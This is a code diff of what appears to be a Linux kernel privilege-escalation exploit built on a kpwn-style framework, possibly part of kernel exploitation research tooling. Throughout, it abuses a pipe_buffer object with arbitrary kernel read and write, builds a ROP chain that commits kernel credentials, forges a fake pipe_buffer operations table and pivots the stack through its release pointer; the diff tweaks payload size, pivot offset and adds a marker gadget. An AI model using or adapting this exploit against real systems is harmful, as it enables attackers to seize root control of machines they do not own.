@@ -32,8 +32,9 @@ typedef struct pipe_buffer {
     /* size: 40, cachelines: 1, members: 6 */
 } pipe_buffer;
 
+Kpwn kpwn;
+
 uint64_t alloc_victim_pipe(pipefds pipefds) {
-    Kpwn kpwn;
     auto pipeMallocLog = kpwn.InstallKprobe("__kmalloc", 1, CALL_LOG, "create_pipe_files");
 
     Syscalls::pipe(pipefds);
@@ -49,12 +50,10 @@ uint64_t alloc_victim_pipe(pipefds pipefds) {
 }
 
 std::vector<uint8_t> trigger_vuln_arb_read(uint64_t addr, uint64_t size) {
-    Kpwn kpwn;
     return kpwn.Read(addr, size);
 }
 
 void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
-    Kpwn kpwn;
     kpwn.Write(addr, data);
 }
 
@@ -79,11 +78,12 @@ int main(int argc, const char** argv) {
     printf("[+] ROP chain:\n");
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
+    target.AddRopAction(rop, RopActionId::TELEFORK, {2000});
+    rop.Add(0xffffffff41414141);
     HexDump::Print(rop.GetData());
 
     printf("[+] Preparing fake pipe_buffer and ops\n");
-    Payload payload(256);
+    Payload payload(1024);
 
     uint64_t release_offs = offsetof(pipe_buf_operations, release);
     uint64_t fake_ops_offs = offsetof(pipe_buffer, flags) - release_offs;
@@ -91,7 +91,7 @@ int main(int argc, const char** argv) {
     auto release_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
-    auto rop_pivot = pivot_finder.PivotToRop(rop);
+    auto rop_pivot = pivot_finder.PivotToRop(rop, 768);
     rop_pivot.PrintDebugInfo();
     *release_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();
 
